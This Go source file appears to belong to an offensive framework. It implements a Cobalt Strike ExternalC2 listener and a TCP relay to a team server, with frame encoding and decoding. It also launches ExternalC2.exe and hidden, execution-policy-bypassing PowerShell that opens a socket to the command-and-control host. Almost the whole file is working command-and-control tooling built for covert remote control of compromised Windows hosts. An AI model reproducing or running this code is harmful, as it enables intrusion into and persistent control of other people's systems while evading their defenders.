package cobaltstrike

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/ares/engine/internal/logger"
)

func (e *CobaltStrikeEngine) StartExternalC2Listener(name string, port int, csHost string, csPort int) (string, error) {
	e.mu.Lock()
	defer e.mu.Unlock()

	if _, ok := e.listeners[name]; ok {
		return "", fmt.Errorf("listener %s already exists", name)
	}

	listener := &CSExternalC2Listener{
		Name: name,
		Type: "externalc2",
		Port: port,
	}
	e.listeners[name] = listener

	go func() {
		ln, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
		if err != nil {
			logger.Error(fmt.Sprintf("[CobaltStrike] ExternalC2 listen error: %v", err))
			return
		}
		defer ln.Close()
		logger.Info(fmt.Sprintf("[CobaltStrike] ExternalC2 listener %s on :%d", name, port))

		for {
			conn, err := ln.Accept()
			if err != nil {
				logger.Error(fmt.Sprintf("[CobaltStrike] ExternalC2 accept: %v", err))
				return
			}
			go e.handleExternalC2Connection(conn, csHost, csPort)
		}
	}()

	result := fmt.Sprintf("[+] ExternalC2 listener '%s' started on port %d (CS: %s:%d)", name, port, csHost, csPort)
	logger.Info("[CobaltStrike] " + result)
	return result, nil
}

func (e *CobaltStrikeEngine) StopExternalC2Listener(name string) (string, error) {
	e.mu.Lock()
	defer e.mu.Unlock()

	if _, ok := e.listeners[name]; !ok {
		return "", fmt.Errorf("listener %s not found", name)
	}

	delete(e.listeners, name)
	result := fmt.Sprintf("[+] ExternalC2 listener '%s' stopped", name)
	logger.Info("[CobaltStrike] " + result)
	return result, nil
}

func (e *CobaltStrikeEngine) ExternalC2Send(frame []byte) ([]byte, error) {
	e.mu.RLock()
	conn := e.externalC2Conn
	e.mu.RUnlock()

	if conn == nil {
		return nil, fmt.Errorf("externalc2 not connected")
	}

	length := make([]byte, 4)
	binary.LittleEndian.PutUint32(length, uint32(len(frame)))
	if _, err := conn.Write(length); err != nil {
		return nil, fmt.Errorf("write length: %w", err)
	}
	if _, err := conn.Write(frame); err != nil {
		return nil, fmt.Errorf("write frame: %w", err)
	}

	if _, err := io.ReadFull(conn, length); err != nil {
		return nil, fmt.Errorf("read response length: %w", err)
	}
	respLen := binary.LittleEndian.Uint32(length)
	resp := make([]byte, respLen)
	if _, err := io.ReadFull(conn, resp); err != nil {
		return nil, fmt.Errorf("read response: %w", err)
	}
	return resp, nil
}

func (e *CobaltStrikeEngine) ExternalC2Heartbeat(listenerName string) (string, error) {
	heartbeat := []byte{0x00}
	resp, err := e.ExternalC2Send(heartbeat)
	if err != nil {
		return "", fmt.Errorf("heartbeat failed: %w", err)
	}
	return fmt.Sprintf("heartbeat OK: %x", resp), nil
}

func (e *CobaltStrikeEngine) handleExternalC2Connection(client net.Conn, csHost string, csPort int) {
	defer client.Close()
	logger.Info(fmt.Sprintf("[CobaltStrike] ExternalC2 client connected: %s", client.RemoteAddr()))

	csAddr := net.JoinHostPort(csHost, strconv.Itoa(csPort))
	server, err := net.DialTimeout("tcp", csAddr, 10*time.Second)
	if err != nil {
		logger.Error(fmt.Sprintf("[CobaltStrike] connect to CS: %v", err))
		return
	}
	defer server.Close()

	errCh := make(chan error, 2)
	go func() {
		_, err := io.Copy(server, client)
		errCh <- err
	}()
	go func() {
		_, err := io.Copy(client, server)
		errCh <- err
	}()
	<-errCh
}

func (e *CobaltStrikeEngine) spawnExternalC2Process(csHost string, csPort int, pipeName string) (string, error) {
	args := []string{
		fmt.Sprintf("http://%s:%d", csHost, csPort),
		pipeName,
	}
	cmd := exec.Command("ExternalC2.exe", args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Start(); err != nil {
		return "", fmt.Errorf("spawn externalc2: %w", err)
	}
	go cmd.Wait()
	return fmt.Sprintf("[+] ExternalC2.exe spawned (pid=%d)", cmd.Process.Pid), nil
}

func ParseExternalC2Frame(data []byte) (int, []byte, error) {
	if len(data) < 4 {
		return 0, nil, fmt.Errorf("frame too short")
	}
	frameLen := int(binary.LittleEndian.Uint32(data[:4]))
	if len(data) < 4+frameLen {
		return 0, nil, fmt.Errorf("incomplete frame")
	}
	frameType := int(data[4])
	payload := data[5 : 4+frameLen]
	return frameType, payload, nil
}

type ExternalC2Frame struct {
	Type    byte            `json:"type"`
	Payload json.RawMessage `json:"payload"`
}

const (
	FrameHeartbeat byte = 0x00
	FrameCommand   byte = 0x01
	FrameResult    byte = 0x02
	FrameError     byte = 0x03
)

func BuildExternalC2Frame(frameType byte, payload []byte) []byte {
	length := 1 + len(payload)
	data := make([]byte, 4+length)
	binary.LittleEndian.PutUint32(data[:4], uint32(length))
	data[4] = frameType
	copy(data[5:], payload)
	return data
}

func (e *CobaltStrikeEngine) StartExternalC2PowerShell(name string, csHost string, csPort int) (string, error) {
	script := fmt.Sprintf(`
$client = New-Object System.Net.Sockets.TcpClient('%s',%d);
$stream = $client.GetStream();
$buffer = New-Object byte[] 1024;
while(($i = $stream.Read($buffer,0,$buffer.Length)) -ne 0){
	$data = $buffer[0..($i-1)];
	$stream.Write($data,0,$data.Length);
}
$client.Close();
`, csHost, csPort)

	cmd := exec.Command("powershell", "-NoP", "-NonI", "-W", "Hidden", "-Exec", "Bypass", "-C", script)
	if err := cmd.Start(); err != nil {
		return "", fmt.Errorf("start externalc2 powershell: %w", err)
	}

	go cmd.Wait()
	return fmt.Sprintf("[+] ExternalC2 PowerShell bridge started (pid=%d)", cmd.Process.Pid), nil
}

func (e *CobaltStrikeEngine) ListExternalC2Listeners() []CSExternalC2Listener {
	e.mu.RLock()
	defer e.mu.RUnlock()
	result := make([]CSExternalC2Listener, 0, len(e.listeners))
	for _, l := range e.listeners {
		result = append(result, *l)
	}
	return result
}

func StartExternalC2ListenerCLI(name string, port int, csHost string, csPort string) (string, error) {
	parts := []string{
		"powershell", "-NoP", "-NonI", "-W", "Hidden",
		fmt.Sprintf("Start-Process -NoNewWindow ExternalC2.exe -ArgumentList 'http://%s:%s','%s'", csHost, csPort, name),
	}
	output, err := exec.Command(parts[0], parts[1:]...).CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("externalc2 cli: %w", err)
	}
	return strings.TrimSpace(string(output)), nil
}
